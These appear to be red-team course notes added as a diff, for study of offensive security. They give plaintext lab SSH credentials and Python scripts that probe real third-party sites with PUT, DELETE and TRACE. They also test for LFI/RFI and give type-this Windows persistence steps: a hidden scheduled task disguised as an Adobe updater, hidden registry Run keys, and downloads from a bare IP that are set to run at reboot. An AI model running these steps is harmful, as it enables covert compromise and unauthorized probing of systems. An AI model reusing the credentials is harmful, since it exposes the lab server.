@@ -1,0 +1,791 @@
+----------------------Day 1------------------------------
+
+Exploit Analysis
+
+#######################################################
+# Open the following web links below as tabs          #
+# For each web link answer all of the questions below #
+#######################################################
+https://www.exploit-db.com/exploits/46762
+https://www.exploit-db.com/exploits/46070
+https://www.exploit-db.com/exploits/40713
+https://www.exploit-db.com/exploits/46458
+https://www.exploit-db.com/exploits/40712
+https://www.exploit-db.com/exploits/40714
+https://www.exploit-db.com/exploits/40680
+https://www.exploit-db.com/exploits/40673
+https://www.exploit-db.com/exploits/40681
+https://www.exploit-db.com/exploits/37731
+https://www.exploit-db.com/exploits/31254
+https://www.exploit-db.com/exploits/31255
+https://www.exploit-db.com/exploits/27703
+https://www.exploit-db.com/exploits/27277
+https://www.exploit-db.com/exploits/26495
+https://www.exploit-db.com/exploits/24557
+https://www.exploit-db.com/exploits/39417
+https://www.exploit-db.com/exploits/23243
+ 
+ 
+ 
+                      ###############################
+###################### # Class Exploit Dev Quiz Task # ######################
+                      ###############################
+ 
+ 
+EID number:
+ 
+1. Vulnerable Software Info
+    a- Target Product Name
+    b- Target Software version
+    c- Available for download on exploit-db.com
+ 
+ 
+2. Target platform
+    a- OS Name                              (ex: Windows XP)
+    b- Service pack                         (ex: SP3)
+    c- Language pack                        (ex: English)
+ 
+ 
+3. Exploit info
+    a- modules imported                     (ex: sys, re, os)
+    b- application entry point              (ex: TRUN)
+    c- distance to EIP                      (ex: 2006)
+    d- how is code redirection done         (ex: JMP ESP, JMP ESI)
+    e- number of NOPs                       (ex: 10 * \x90  = 10 NOPs)
+    f- length of shellcode                  (ex: 368)
+    g- bad characters                       (ex: \x0a\x00\x0d)
+    h- is the target ip hard-coded
+    i- what does the shellcode do           (ex: bind shell, reverse shell, calc)
+    j- what is the total buffer length
+    k- does the exploit do anything to ensure the buffer doesn't exceed a certain length
+    l- Is this a server side or client-side exploit
+
+
+
+
+######################################
+# Exploit Development Scoring System #
+######################################
+
+1. Comments
+-----------
+1a. Has detailed comments (1 point)
+1b. Comments target app info (1 point)
+1c. Comments target platform info (1 point)
+1d. Comments protocol or file spec info (1 point)
+1e. Comments program redirection info (1 point)
+1f. Comments shellcode info (1 point)
+
+
+2. Modules/Libraries
+--------------------
+2a. Uses correct modules/libraries to properly interact with protocol or file type (1 point)
+
+
+3. Program redirection
+----------------------
+3a. Use correct program redirection (JMP ESP, CALL ESP, PUSH ESP; RET) from the correct platform for stable program code redirection
+
+4. Shellcode
+------------
+4a. Tests for bad characters (1 point)
+4b. Tests for maximum length of payload (1 point)
+
+5. Exploit stability
+--------------------
+5a. Use NOPS correctly
+5b. Maps to protocol or file spec correctly
+5c. Uses a stack shift if applicable
+5c. Uses correct EXITFUNC for stability (1 point)
+
+
+
+
+
+
+
+----------------------Day 2------------------------------
+
+- I prefer to use Putty to SSH into my Linux host.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+Log in to this server to perform these labs:
+ 
+Server:            	149.28.201.171
+Protocol:         	ssh
+Port:                   22
+user:                   redteam
+pass:              	redteam!@
+
+If you are on a Mac (https://osxdaily.com/2017/04/28/howto-ssh-client-mac/)
+ 
+Open a terminal, then type:
+-------------------------------
+ssh -l redteam 149.28.201.171
+-------------------------------
+
+---------------------------Type This-----------------------------------
+cd ~/students/
+mkdir yourname
+cd yourname
+-----------------------------------------------------------------------
+
+
+
+################################
+# Web App Testing with Python3 #
+################################
+ 
+ 
+ 
+ 
+##############################
+# Bannergrabbing a webserver #
+##############################
+ 
+---------------------------Type This-----------------------------------
+nano bannergrab.py
+ 
+ 
+---------------------------Paste This----------------------------------
+ 
+#!/usr/bin/env python3
+import sys
+import socket
+ 
+# Great reference: https://www.mkyong.com/python/python-3-typeerror-cant-convert-bytes-object-to-str-implicitly/
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("45.63.104.73", 80))
+s.send(("GET / HTTP/1.1\r\n\r\n").encode())
+ 
+#Convert response to bytes
+response = b""
+# or use encode()
+#response = "".encode()
+ 
+while True:
+   data = s.recv(4096)
+   response += data
+   if not data:
+       break
+s.close()
+print(response.decode())
+----------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+python3 bannergrab.py
+-----------------------------------------------------------------------
+ 
+ 
+ 
+########################################
+# Testing availability of HTTP methods #
+########################################
+ 
+A  very  good  practice  for  a  penetration  tester  is  to  start  by  listing  the  various  available HTTP methods.
+Following is a Python script with the help of which we can connect to the target web server and enumerate the available HTTP methods:  
+ 
+To begin with, we need to import the requests library:
+ 
+---------------------------
+python3
+import requests
+---------------------------
+ 
+After importing the requests library,create an array of HTTP methods, which we are going to send. We will make use ofsome standard methods like 'GET', 'POST', 'PUT', 'DELETE', 'OPTIONS' and a non-standard method ‘TEST’ to check how a web server can handle the unexpected input.
+ 
+----------------------------------------------------------------------------
+method_list = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE','TEST']
+----------------------------------------------------------------------------
+ 
+The following line of code is the main loop of the script, which will send the HTTP packets to the web server and print the method and the status code.
+ 
+------------------------------------------------------
+for method in method_list:
+  req = requests.request(method, 'https://www.google.com')
+  print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+------------------------------------------------------
+for method in method_list:
+  req = requests.request(method, 'https://www.darkoperator.com')
+  print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+------------------------------------------------------
+for method in method_list:
+  req = requests.request(method, 'https://dvws1.infosecaddicts.com/dvws1/vulnerabilities/xst/xst.php')
+  print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+------------------------------------------------------
+for method in method_list:
+  req = requests.request(method, 'http://www.dybedu.com')
+  print (method, req.status_code, req.reason)
+------------------------------------------------------
+ 
+ 
+The next line will test for the possibility of cross site tracing (XST) by sending the TRACE method.
+ 
+-------------------------------------------------------------
+if method == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
+  print ('Cross Site Tracing(XST) is possible')
+-------------------------------------------------------------
+
+
+-------------------------------
+exit()
+-------------------------------
+
+ 
+ 
+*** Full code with example url: ***
+ 
+---------------------------Type This-----------------------------------
+nano xst.py
+ 
+ 
+---------------------------Paste This----------------------------------
+#!/usr/bin/env python3
+import requests
+method_list = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE','TEST']
+for method in method_list:
+  req = requests.request(method, 'https://dvws1.infosecaddicts.com/dvws1/vulnerabilities/xst/xst.php')
+  print (method, req.status_code, req.reason)
+if method == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
+  print ('Cross Site Tracing(XST) is possible')
+ 
+-------------------------------------------------------------------------
+ 
+ 
+After running the above script for a particular web server, we will get 200 OK responses for a particular method accepted by the web server. We will get a 403 Forbidden response if the web server explicitly denies the method. Once we send the TRACE method for testing cross  site  tracing  (XST), we  will  get 405  Not  Allowed responses  from  the  web  server otherwise we will get the message ‘Cross Site Tracing(XST) is possible’.
+ 
+ 
+---------------------------Type This-----------------------------------
+python3 xst.py
+-----------------------------------------------------------------------
+ 
+ 
+ 
+##########################################
+# Foot printing by checking HTTP headers #
+##########################################
+ 
+ 
+HTTP headers are found in both requests and responses from the web server. They also carry very important information about servers. That is why penetration tester is always interested in parsing information through HTTP headers. Following is a Python script for getting the information about headers of the web server:
+ 
+To begin with, let us import the requests library:
+ 
+------------------------
+import requests
+------------------------
+ 
+We need to send a  GET request to the web  server. The following line  of code makes a simple GET request through the requests library.
+ 
+---------------------------------------------
+request = requests.get('enter the URL')
+---------------------------------------------
+ 
+Next, we will generate a list of headers about which you need the information.
+ 
+---------------------------------------------------------------------------------------------------------------
+header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code', 'Connection', 'Content-Length']
+---------------------------------------------------------------------------------------------------------------
+ 
+Next is a try and except block.
+ 
+---------------------------------------------------
+for header in header_list:
+ 
+  try:
+     result = request.headers[header]
+     print ('%s: %s' % (header, result))
+  except Exception as err:
+        print ('%s: No Details Found' % header)
+ 
+---------------------------------------------------
+ 
+ 
+ 
+ 
+*** Example Full Code: ***
+ 
+---------------------------Type This-----------------------------------
+nano headercheck.py
+ 
+ 
+---------------------------Paste This----------------------------------
+#!/usr/bin/env python3
+import requests
+request = requests.get('https://dvws1.infosecaddicts.com/dvws1/appinfo.php')
+header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code', 'Connection', 'Content-Length']
+for header in header_list:
+     try:
+        result = request.headers[header]
+        print ('%s: %s' % (header, result))
+     except Exception as err:
+              print ('%s: No Details Found' % header)
+----------------------------------------------------------------------------------------------------------------
+ 
+ 
+After running the above script for a particular web server, we will get the information about the  headers  provided  in  the  header  list.  If  there  will  be  no  information  for  a  particular header then it will give the message ‘No Details Found’.
+ 
+ 
+---------------------------Type This-----------------------------------
+python3 headercheck.py
+-----------------------------------------------------------------------
+ 
+ 
+##############################################
+# Testing insecure web server configurations #
+##############################################
+ 
+We can use HTTP header information to test insecure web server configurations. In the following Python script, we are going to use try/except block to test insecure web server headers for number of URLs that are saved in a text file name websites.txt.
+---------------------------Type This-----------------------------------
+nano websites.txt
+ 
+---------------------------Paste This----------------------------------
+https://www.google.com
+https://www.cnn.com
+https://foxnews.com
+https://phpapp.infosecaddicts.com/
+https://aspdotnetapp.infosecaddicts.com/
+https://dvws1.infosecaddicts.com/
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+nano insecure_config_check.py
+ 
+ 
+---------------------------Paste This----------------------------------
+#!/usr/bin/env python3
+ 
+# Reference: https://www.keycdn.com/blog/http-security-headers
+ 
+import requests
+urls = open("websites.txt", "r")
+for url in urls:
+  url = url.strip()
+  req = requests.get(url)
+  print (url, 'report:')
+  try:
+     protection_xss = req.headers['X-XSS-Protection']
+     if protection_xss != '1; mode=block':
+        print ('X-XSS-Protection not set properly, it may be possible:', protection_xss)
+  except:
+     print ('X-XSS-Protection not set, it may be possible')
+  try:
+     options_content_type = req.headers['X-Content-Type-Options']
+     if options_content_type != 'nosniff':
+        print ('X-Content-Type-Options not set properly:', options_content_type)
+  except:
+     print ('X-Content-Type-Options not set')
+  try:
+     transport_security = req.headers['Strict-Transport-Security']
+  except:
+     print ('HSTS header not set properly, Man in the middle attacks is possible')
+  try:
+     content_security = req.headers['Content-Security-Policy']
+     print ('Content-Security-Policy set:', content_security)
+  except:
+     print ('Content-Security-Policy missing')
+ 
+-----------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+python3 insecure_config_check.py
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+nano LFI-RFI.py
+ 
+ 
+---------------------------Paste This----------------------------------
+ 
+#!/usr/bin/env python3
+print("\n### PHP LFI/RFI Detector ###")
+ 
+import urllib.request, urllib.error, urllib.parse,re,sys
+ 
+TARGET = "http://45.63.104.73/showfile.php?filename=about.txt"
+RFIVULN = "https://raw.githubusercontent.com/gruntjs/grunt-contrib-connect/master/test/fixtures/hello.txt?"
+TravLimit = 12
+ 
+print("==> Testing for LFI vulns..")
+TARGET = TARGET.split("=")[0]+"="               ## URL MANUPLIATION
+for x in range(1,TravLimit):                    ## ITERATE THROUGH THE LOOP
+  TARGET += "../"
+  try:
+      source = urllib.request.urlopen((TARGET+"etc/passwd")).read().decode() ## WEB REQUEST
+  except urllib.error.URLError as e:
+      print("$$$ We had an Error:",e)
+      sys.exit(0)
+  if re.search("root:x:0:0:",source):          ## SEARCH FOR TEXT IN SOURCE
+      print("!! ==> LFI Found:",TARGET+"etc/passwd")
+      break ## BREAK LOOP WHEN VULN FOUND
+ 
+print("\n==> Testing for RFI vulns..")
+TARGET = TARGET.split("=")[0]+"="+RFIVULN       ## URL MANUPLIATION
+try:
+  source = urllib.request.urlopen(TARGET).read().decode() ## WEB REQUEST
+except urllib.error.URLError as e:
+  print("$$$ We had an Error:",e)
+  sys.exit(0)
+if re.search("Hello world",source):             ## SEARCH FOR TEXT IN SOURCE
+  print("!! => RFI Found:",TARGET)
+ 
+print("\nScan Complete\n")                      ## DONE
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+python3 LFI-RFI.py
+-----------------------------------------------------------------------
+
+
+
+Come up with an analysis framework like yesterday in order to analyze these exploits:
+https://www.exploit-db.com/exploits/46487
+https://www.exploit-db.com/exploits/48711
+https://www.exploit-db.com/exploits/48722
+https://www.exploit-db.com/exploits/41976
+https://www.exploit-db.com/exploits/46479
+
+
+
+----------------------Day 3------------------------------
+###############
+# Persistance #
+###############
+
+
+---- Scheduled Task Based Persistance ----
+1. Scheduled task based on most commonly occuring event ID
+https://github.com/TestingPens/MalwarePersistenceScripts/blob/master/user_event_persistence.ps1
+
+
+
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistence
+
+(new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/TestingPens/MalwarePersistenceScripts/master/user_event_persistence.ps1", "c:\persistence\user_event_persistence.ps1")
+
+.\user_event_persistence.ps1
+-------------------------------------------------------------------------
+
+
+
+- Alternative method:
+--------------------
+In this case we will not be running PowerShell. We create a scheduled task definition file called "Adobe Flash Player Updater.xml"
+ 
+- Copy and paste the code below into the "Adobe Flash Player Updater.xml" definition file on target machine:
+- adapt  <UserId></UserId> to SID of current user if you do not have administrative privileges (wmic useraccount where name='user' get sid)
+- adapt  <Command>C:\Windows\System32\calc.exe</Command> to your reverse shell executable
+- this scheduled task triggers on a event, can be changed to regular calls (e.g. once an hour)
+ 
+--------------------------------
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Author>Adobe Systems Incorporated</Author>
+    <Description>This task keeps your Adobe Flash Player installation up to date with the latest enhancements and security fixes. If this task is disabled or removed, Adobe Flash Player will be unable to automatically secure your machine with the latest security fixes.</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <EventTrigger>
+      <Enabled>true</Enabled>
+      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Application"&gt;&lt;Select Path="Application"&gt;*[System[EventID=15]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
+    </EventTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>C:\Windows\System32\calc.exe</Command>
+    </Exec>
+  </Actions>
+</Task>
+ 
+---------------------------
+ 
+Now let's create the scheduled task
+---------------------------Type This-----------------------------------
+schtasks /create /tn "Adobe Updater" /xml "Adobe Flash Player Updater.xml"
+----------------------------------------------------------------------- 
+
+
+Sit back and wait for the task to trigger. By the way we got the correct XML file format by creating a scheduled tasked and exporting it to an XML file. Then we were able to make some trivial changes to the file and import it.
+
+
+
+
+---- Registry Based Persistance ---
+1. RunOnce key persistance trick
+Reference:
+https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
+
+
+
+1. upload your executable to system
+2. add registry entry (requires admin privileges):
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v "Line1" /d "||c:\path\to\malicious.exe"
+ 
+Note:
+Beacon/Shell may prevent the user to login as he is hanging in the Beacon executable. Solution: spawn new beacon and exit initial beacon.
+
+
+
+
+
+2. GLOBALFLAGS IN IMAGE FILE EXECUTION OPTIONS
+Let's try this:
+https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/
+
+
+2. Hide Reg
+Let's try this code out:
+https://gist.github.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741
+
+Reference:
+https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
+
+
+
+
+Get the following two files
+---------------------------
+https://raw.githubusercontent.com/jaredcatkinson/PSReflect-Functions/master/PSReflect.ps1
+https://gist.githubusercontent.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741/raw/8f77b5e2f1952299f3a2dca0ef6c9266fe3e7b08/PSReflect-RegHide.ps1
+
+In "PSReflect-RegHide.ps1" line 126, you can specify which command will be executed upon reboot (ex: 'cmd /c calc.exe'). It will be invisible for regedit and powershell.
+
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistance
+
+(new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/jaredcatkinson/PSReflect-Functions/master/PSReflect.ps1", "c:\persistance\PSReflect.ps1")
+
+(new-object System.Net.WebClient).DownloadFile("https://gist.githubusercontent.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741/raw/8f77b5e2f1952299f3a2dca0ef6c9266fe3e7b08/PSReflect-RegHide.ps1", "c:\persistance\PSReflect-RegHide.ps1")
+
+.\PSReflect-RegHide.ps1
+-------------------------------------------------------------------------
+
+
+
+Now, let's check to see if the newly created registry value is hidden. You can do this by typing the following:
+---------------------------Type This-----------------------------------
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+----------------------------------------------------------------------- 
+However, it will be visible e.g. for Sysinternals Autorun tool
+
+
+
+3. VShadow
+Let's try this out:
+https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/
+
+
+
+1. Download vshadow.exe including in the WinSDK
+    Windows 7: https://www.microsoft.com/en-us/download/details.aspx?id=8279
+    Windows 10: https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk
+2. Upload the vshadow.exe to the target machine
+3. Choose an arbitrary persistence mechanism to start vshadow.exe (e.g. Reg Key: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d "C:\Temp\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:")
+
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistance
+
+(new-object System.Net.WebClient).DownloadFile("http://45.63.104.73/win10_vshadow_x64.exe", "c:\persistance\vshadow.exe")
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d "c:\persistance\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:"
+-----------------------------------------------------------------------
+
+
+4. INF-SCT
+Let's try this out:
+https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
+https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+
+
+Technique 1: CMSTP
+------------------
+create "c:\persistance\cmstp.inf" with the following content:
+-----------------------------------
+;cmstp.exe cmstp.inf
+ 
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+ 
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+ 
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,c:\persistance\test.sct
+ 
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay"
+ShortSvcName="Yay"
+----------------------------------------------------
+
+
+
+get a sample sct payload (e.g. https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019) and store it in "c:\persistance\test.sct"
+
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistance
+
+(new-object System.Net.WebClient).DownloadFile("https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019", "c:\persistance\test.sct")
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v oemkey /t reg_sz /d "\"C:\Windows\System32\cmstp.exe\" /s C:\persistance\cmstp.inf"
+-----------------------------------------------------------------------
+
+ 
+reboot your machine
+your sct payload will be executed upon reboot. HOWEVER, as a Windows binary executes it, Sysinternals Autorun tool will not show it, unless you untick  "Options->Hide Windows Entries" option
+
+
+ 
+5. GPScript.exe
+Let's try this out:
+https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/
+
+
+
+---- Cobalt Strike Agressor Persistance Scripts ----
+https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/PersistKit/PersistKit.cna
+https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/UserSchtasksPersist.cna
+https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/ServiceEXEPersist.cna
+
+References:
+https://docs.broadcom.com/doc/istr-living-off-the-land-and-fileless-attack-techniques-en
+
+
+
+
+
+
+Day 4
+--------
+
+https://drive.google.com/file/d/16Ju5DHfsQAz2N-peWwElU8hb8BnR6cPv/view?usp=sharing
+https://drive.google.com/file/d/1-5JbaoRJzs9He2gFNb9RJDuaQwnLhngw/view?usp=sharing
+
+
+
+
+
+Intro to Shellcode
+
+Step 1: Download and install CodeBlocks
+https://sourceforge.net/projects/codeblocks/files/Binaries/20.03/Windows/codeblocks-20.03mingw-setup.exe/download
+
+If you are new to the CodeBlocks tool like I was here is the manual:
+http://codeblocks.org/docs/manual_codeblocks_en.pdf
+
+
+Step 2: Create a folder on your desktop called ShellCoding
+
+
+Step 3: Save arwin.c and ListDLLs into this new ShellCoding folder on your Desktop
+Goto both http://www.vividmachines.com/shellcode/arwin.c, http://www.ollydbg.de/odbg201.zip, and https://download.sysinternals.com/files/ListDlls.zip
+to download these files into this new ShellCoding folder on your Desktop 
+
+
+Step 4: Complile arwin.c
+Open arwin.c in the CodeBlocks application, and choose the option to "Build". 
+Open a command prompt and browse to the ShellCoding folder. Type 'dir' to ensure that arwin.exe is in directory.
+If it's not there, then there was an issue with your build. Ask me to help you troubleshoot this.
+
+
+Step 5: Linux vs Windows code execution basics
+Linux, unlike windows, provides a direct way to interface with the kernel through the int 0x80 interface. A complete listing of the Linux syscall table can be found here (https://filippo.io/linux-syscall-table/). Windows on the other hand, does not have a direct kernel interface. The system must be interfaced by loading the address of the function that needs to be executed from a DLL (Dynamic Link Library). 
+
+The key difference between the two is the fact that the address of the functions found in windows will vary from OS version to OS version while the int 0x80 syscall numbers will remain constant. Windows programmers did this so that they could make any change needed to the kernel without any hassle; Linux on the contrary has fixed numbering system for all kernel level functions, and if they were to change, there would be a million angry programmers (and a lot of broken code).
+
+Step 6: Look at DLLs utilized by exe files
+calc
+
+Listdlls64.exe calc
+
+notepad
+
+Listdlls64.exe notepad
+
+
+
+
+Step 7: Look at the addresses of the functions utilized by each DLL file
+
+arwin.exe user32.dll MessageBoxA
+
+arwin.exe kernel32.dll LoadLibraryA
+
+arwin.exe kernel32.dll Sleep
+
+arwin.exe kernel32.dll GetProcAddress
+
+arwin.exe kernel32.dll ExitProcess
+
+Step 8: Get a message box to pop up
+https://resources.infosecinstitute.com/injecting-spyware-exe-code-injections/#gref
+
+Step 9: Do chapters 1-3 in this Shellcoding tutorial
+https://www.exploit-db.com/docs/english/17065-manual-shellcode.pdf
